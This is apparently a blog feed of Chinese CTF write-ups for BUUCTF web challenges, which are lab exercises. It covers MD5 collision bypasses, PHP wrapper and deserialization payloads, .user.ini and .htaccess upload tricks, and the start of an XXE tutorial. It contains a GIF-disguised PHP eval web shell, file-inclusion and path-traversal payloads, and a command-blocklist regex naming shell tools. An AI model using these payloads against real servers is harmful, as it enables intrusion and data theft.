class="string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;xixi～ no flag&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$txt</span> = base64_encode(file_get_contents(<span class="variable">$file</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . <span class="variable">$txt</span> . <span class="string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cmd</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;forbid ~&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; md5(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === md5(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `<span class="variable">$cmd</span>`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;md5 is funny ~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  body&#123;</span><br><span class="line">   background:url(./bj.png)  no-repeat center center;</span><br><span class="line">   background-size:cover;</span><br><span class="line">   background-attachment:fixed;</span><br><span class="line">   background-color:<span class="comment">#CCCCCC;</span></span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>至于md5碰撞的话，本来可以用数组绕过，但是这里使用了（String）强制转换，数组被强制转换的结果都为<code>string(5) &quot;Array&quot;</code></p><h3 id="MD5强碰撞"><a href="#MD5强碰撞" class="headerlink" title="MD5强碰撞"></a>MD5强碰撞</h3><p>md5弱比较，为0e开头的会被识别为科学记数法，结果均为0</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">param1=QNKCDZO&amp;param2=aabg7XSs</span><br></pre></td></tr></table></figure><p>两个参数不是字符串，而是数组，md5()函数无法解出其数值，而且不会报错，就会得到===强比较的值相等</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">param1[]=<span class="number">111</span>&amp;param2[]=<span class="number">222</span></span><br></pre></td></tr></table></figure><p><a href="https://www.jianshu.com/p/c9089fd5b1ba">MD5碰撞的例子</a></p><h6 id="hex2bin-py"><a href="#hex2bin-py" class="headerlink" title="hex2bin.py"></a>hex2bin.py</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!coding:utf-8</span></span><br><span class="line">hexString1 = <span class="string">&#x27;4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa200a8284bf36e8e4b55b35f427593d849676da0d1555d8360fb5f07fea2&#x27;</span></span><br><span class="line">hexString2 = <span class="string">&#x27;4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa202a8284bf36e8e4b55b35f427593d849676da0d1d55d8360fb5f07fea2&#x27;</span></span><br><span class="line"></span><br><span class="line">hexList1 = []</span><br><span class="line">intList1 = []</span><br><span class="line">asciiString1 =<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    intString1 = hexString1[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">    hexString1 = hexString1[<span class="number">2</span>:]</span><br><span class="line">    hexList1.append(intString1)</span><br><span class="line">    <span class="keyword">if</span> (hexString1 == <span class="string">&#x27;&#x27;</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> hexList1:</span><br><span class="line">    intList1.append(<span class="built_in">int</span>(i,<span class="number">16</span>))</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> intList1:</span><br><span class="line">    asciiString1 += <span class="built_in">chr</span>(<span class="built_in">int</span>(j))</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;1.bin&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">f.write(asciiString1)</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">hexList2 = []</span><br><span class="line">intList2 = []</span><br><span class="line">asciiString2 =<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    intString2 = hexString2[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">    hexString2 = hexString2[<span class="number">2</span>:]</span><br><span class="line">    hexList2.append(intString2)</span><br><span class="line">    <span class="keyword">if</span> (hexString2 == <span class="string">&#x27;&#x27;</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> hexList2:</span><br><span class="line">    intList2.append(<span class="built_in">int</span>(i,<span class="number">16</span>))</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> intList2:</span><br><span class="line">    asciiString2 += <span class="built_in">chr</span>(<span class="built_in">int</span>(j))</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;2.bin&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">f.write(asciiString2)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2 &amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buuctf </tag>
            
            <tag> wp </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[ZJCTF 2019]NiZhuanSiWei</title>
      <link href="/2021/06/18/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/php/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%5BZJCTF%202019%5DNiZhuanSiWei/"/>
      <url>/2021/06/18/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/php/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%5BZJCTF%202019%5DNiZhuanSiWei/</url>
      
        <content type="html"><![CDATA[<p>知识点：</p><p>data://　　　　写入数据</p><p>php://input　　执行php</p><p>　　//filter　　查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$text</span>` `= ``<span class="variable">$_GET</span>``[``<span class="string">&quot;text&quot;</span>``];</span><br><span class="line"><span class="variable">$file</span>` `= ``<span class="variable">$_GET</span>``[``<span class="string">&quot;file&quot;</span>``];</span><br><span class="line"><span class="variable">$password</span>` `= ``<span class="variable">$_GET</span>``[``<span class="string">&quot;password&quot;</span>``];</span><br><span class="line"><span class="keyword">if</span>``(<span class="keyword">isset</span>(``<span class="variable">$text</span>``)&amp;&amp;(``file_get_contents``(``<span class="variable">$text</span>``,``<span class="string">&#x27;r&#x27;</span>``)===``<span class="string">&quot;welcome to the zjctf&quot;</span>``))&#123;</span><br><span class="line">  ``<span class="keyword">echo</span>` `<span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>``.``file_get_contents``(``<span class="variable">$text</span>``,``<span class="string">&#x27;r&#x27;</span>``).``<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>``;</span><br><span class="line">  ``<span class="keyword">if</span>``(preg_match(``<span class="string">&quot;/flag/&quot;</span>``,``<span class="variable">$file</span>``))&#123;</span><br><span class="line">    ``<span class="keyword">echo</span>` `<span class="string">&quot;Not now!&quot;</span>``;</span><br><span class="line">    ``<span class="keyword">exit</span>``();</span><br><span class="line">  ``&#125;``<span class="keyword">else</span>``&#123;</span><br><span class="line">    ``<span class="keyword">include</span>``(``<span class="variable">$file</span>``); ``<span class="comment">//useless.php</span></span><br><span class="line">    ``<span class="variable">$password</span>` `= unserialize(``<span class="variable">$password</span>``);</span><br><span class="line">    ``<span class="keyword">echo</span>` `<span class="variable">$password</span>``;</span><br><span class="line">  ``&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>``&#123;</span><br><span class="line">  ``highlight_file(``<span class="keyword">__FILE__</span>``);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>1.file_get_contents($text,’r’)===”welcome to the zjctf”,从文件里读取字符串，还要和welcome to the zjctf相等。</p><p>payload:?text=data://text/plain,welcome to the zjctf</p><p>2.useless.php文件包含</p><p>payload:file=php://filter/read=convert.base64-encode/resource=useless.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure><p>直接让file=flag.php</p><p>反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>=<span class="string">&quot;flag.php&quot;</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123; </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$password</span>=<span class="keyword">new</span> Flag();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$password</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}</p><p>text=data://text/plain,welcome%20to%20the%20zjctf&amp;file=useless.php&amp;password=O:4:%22Flag%22:1:{s:4:%22file%22;s:8:%22flag.php%22;}</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buuctf </tag>
            
            <tag> wp </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[SUCTF 2019]CheckIn</title>
      <link href="/2021/06/18/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/php/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%5BSUCTF%202019%5DCheckIn/"/>
      <url>/2021/06/18/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/php/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%5BSUCTF%202019%5DCheckIn/</url>
      
        <content type="html"><![CDATA[<p>知识点：</p><p>.user.ini。</p><ul><li>auto_append_file : 指定一个文件 , 自动包含在要执行的文件末尾 , 类似与在可执行文件末尾调用了 require() 函数</li><li>auto_prepend_file : 指定一个文件 , 自动包含在要执行的文件开头 , 类似与在可执行文件开头调用了 require() 函数</li></ul><h5 id="利用-user-ini漏洞的条件"><a href="#利用-user-ini漏洞的条件" class="headerlink" title="利用.user.ini漏洞的条件"></a>利用.user.ini漏洞的条件</h5><ul><li>服务器脚本语言为PHP</li><li>服务器使用CGI／FastCGI模式</li><li><strong>上传目录下要有可执行的php文件</strong></li></ul><p>该题对</p><p><strong>exif_imagetype:not imag</strong> 这是因为题目用exif_imagetype进行了检测，判断是否是图片文件。</p><h4 id="user-ini文件"><a href="#user-ini文件" class="headerlink" title="user.ini文件"></a>user.ini文件</h4><p>其中有两个配置，可以用来制造后门：<br>auto_append_file、auto_prepend_file<br>指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而auto_append_file类似，只是在文件后面包含。 使用方法很简单，直接写在.user.ini中：</p><p>gif89a 为图片头</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#user.ini</span></span><br><span class="line">GIF89a</span><br><span class="line">auto_prepend_file=shell.gif</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#shell.gif</span></span><br><span class="line">GIF89a?</span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>])&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>然后就可以用菜刀连了。但是它会不时的清除文件，所以链接的不是很稳定，甚至有是时候连不上，但我们可以在网页执行命令。所以我第一次就是在页面执行了命令，找到了flag：<br>扫描根目录：shell=var_dump(scandir(“/“));，我们可以可以看见一个叫flag的文件<br>打印：shell=var_dump(file_get_contents(“/flag”));</p><p>eg：</p><p><a href="http://70446d7d-2c88-4c36-92d2-eedf67a8703b.node3.buuoj.cn/uploads/7da8cd499a49031eb076ec11e9e2aab3/index.php?shell=var_dump(file_get_contents(&quot;/flag&quot;)">http://70446d7d-2c88-4c36-92d2-eedf67a8703b.node3.buuoj.cn/uploads/7da8cd499a49031eb076ec11e9e2aab3/index.php?shell=var_dump(file_get_contents(&quot;/flag&quot;)</a>);</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buuctf </tag>
            
            <tag> wp </tag>
            
            <tag> 文件上传漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[MRCTF2020]你传你🐎呢</title>
      <link href="/2021/06/18/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/php/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%5BMRCTF2020%5D%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2/"/>
      <url>/2021/06/18/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/php/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%5BMRCTF2020%5D%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2/</url>
      
        <content type="html"><![CDATA[<p>最初的htaccess文件是不能上传的，我改了Content-Type后才能上传，但说明能上传htaccess文件，</p><p>htaccess文件：是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p><p>原理：他没有过滤 .htaccess后缀，我们可以构建一个htaccess配置文件，让所有格式文件都解析为php，然后再上传图片马（只要后缀是允许的，随便都可以）就会被解析了。</p><p>文件内容如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure><p>上传.htaccess文件<br>最好把type改成image/jpeg类型</p><p>/var/www/html/upload/f3e466d5e8513076db058202a1b8722d/.htaccess succesfully uploaded!</p><p>上传.jpg文件马</p><p>/var/www/html/upload/f3e466d5e8513076db058202a1b8722d/php.jpg succesfully uploaded!</p><p>最后用蚁剑连</p><p><a href="http://c2a02cc3-bae8-4b13-8387-c1f6cb7fbc7a.node3.buuoj.cn/upload/f3e466d5e8513076db058202a1b8722d/php.jpg">http://c2a02cc3-bae8-4b13-8387-c1f6cb7fbc7a.node3.buuoj.cn/upload/f3e466d5e8513076db058202a1b8722d/php.jpg</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buuctf </tag>
            
            <tag> wp </tag>
            
            <tag> 文件上传漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[强网杯 2019]Upload</title>
      <link href="/2021/06/18/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/php/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%5B%E5%BC%BA%E7%BD%91%E6%9D%AF%202019%5DUpload/"/>
      <url>/2021/06/18/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/php/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%5B%E5%BC%BA%E7%BD%91%E6%9D%AF%202019%5DUpload/</url>
      
        <content type="html"><![CDATA[<p>注册</p><p>登录</p><p>传了一个gif</p><p>看到可以访问目录</p><p>cookiebase64解密 得序列化</p><p>怎么是png</p><p>a:5:{s:2:”ID”;i:3;s:8:”username”;s:7:”admin  “;s:5:”email”;s:12:”<a href="mailto:&#x31;&#x32;&#x33;&#52;&#53;&#x36;&#64;&#x31;&#x2e;&#x63;&#111;&#109;">&#x31;&#x32;&#x33;&#52;&#53;&#x36;&#64;&#x31;&#x2e;&#x63;&#111;&#109;</a>“;s:8:”password”;s:32:”21232f297a57a5a743894a0e4a801fc3”;s:3:”img”;s:79:”../upload/0392412bc2d05c02c9fc9c42c86c3fd3/9185d1d0b5e4e9faec46f10be786ecb8.png”;}</p><p>试试能不能页面跳转</p><p>a:5:{s:2:”ID”;i:3;s:8:”username”;s:7:”admin  “;s:5:”email”;s:12:”<a href="mailto:&#x31;&#50;&#x33;&#x34;&#x35;&#x36;&#64;&#49;&#x2e;&#99;&#x6f;&#109;">&#x31;&#50;&#x33;&#x34;&#x35;&#x36;&#64;&#49;&#x2e;&#99;&#x6f;&#109;</a>“;s:8:”password”;s:32:”21232f297a57a5a743894a0e4a801fc3”;s:3:”img”;s:31:”../../../../../../../etc/passwd”;}</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>/<span class="title">web</span>/<span class="title">controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$checker</span>=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename_tmp</span>=<span class="string">&quot;../public/upload/0392412bc2d05c02c9fc9c42c86c3fd3/9185d1d0b5e4e9faec46f10be786ecb8.png&quot;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&quot;../public/upload/0392412bc2d05c02c9fc9c42c86c3fd3/qwe.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$upload_menu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span>=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$img</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$except</span>=<span class="keyword">array</span>(<span class="string">&#x27;index&#x27;</span>=&gt;<span class="string">&#x27;upload_img&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$checker</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$registed</span>=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> Register()</span><br><span class="line"><span class="variable">$a</span>-&gt;checker=<span class="keyword">new</span> Profile();</span><br><span class="line"><span class="variable">$a</span>-&gt;checker-&gt;checker=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$a</span>))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buuctf </tag>
            
            <tag> wp </tag>
            
            <tag> 文件上传漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从XML到XXE漏洞+ctf实战</title>
      <link href="/2021/06/16/web%E5%AE%89%E5%85%A8/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/XXE%E6%BC%8F%E6%B4%9E/"/>
      <url>/2021/06/16/web%E5%AE%89%E5%85%A8/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/XXE%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是XML"><a href="#什么是XML" class="headerlink" title="什么是XML"></a>什么是XML</h1><p>XML是可扩展标记语言（EXtensible Markup Language）。</p><p><strong>XML与HTML的区别</strong></p><p>XML 被设计用来传输和存储数据，其重点是数据的内容。<br>HTML 被设计用来显示数据，其重点是数据的表现。<br>HTML 旨在显示信息，而 XML 旨在传输信息。</p><p><strong>为什么选择XML</strong><br>现实生活中一些数据之间往往存在一定的关系。我们希望能在计算机中保存和处理这些数据的同时能够保存和处理他们之间的关系。XML就是为了解决这样的需求而产生数据存储格式。</p><p><strong>XML格式与语法</strong><br><code>基本格式：</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</span><span class="comment">&lt;!--xml文件的声明--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bookstore</span>&gt;</span>                                                 <span class="comment">&lt;!--根元素--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">book</span> <span class="attr">category</span>=<span class="string">&quot;COOKING&quot;</span>&gt;</span>        <span class="comment">&lt;!--bookstore的子元素，category为属性--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>1<span class="tag">&lt;/<span class="name">title</span>&gt;</span>            <span class="comment">&lt;!--book的子元素--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">year</span>&gt;</span>2021<span class="tag">&lt;/<span class="name">year</span>&gt;</span>            <span class="comment">&lt;!--book的子元素--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">book</span>&gt;</span>                          <span class="comment">&lt;!--book的结束--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bookstore</span>&gt;</span>                         <span class="comment">&lt;!--bookstore的结束--&gt;</span></span><br></pre></td></tr></table></figure><p><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</code> 称为 XML prolog ，用于声明XML文档的版本和编码，是可选的，必须放在文档开头。</p><p>standalone值是yes的时候表示DTD仅用于检验文档结构，从而外部实体被禁用，但它的默认值是no，而且有些parser会直接忽略这一项。</p><p><code>基本语法：</code></p><ul><li>所有 XML 元素都须有关闭标签。</li><li>XML 标签对大小写敏感。</li><li>XML 必须正确地嵌套。</li><li>XML 文档必须有根元素。</li><li>XML 的属性值须加引号。</li></ul><p>- 在 XML 中，空格会被保留,多个空格不会被合并为一个。</p><h1 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h1><p>文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。DTD可被成行地声明于XML文档中，也可作为一个外部引用。带有DTD的XML文档实例</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 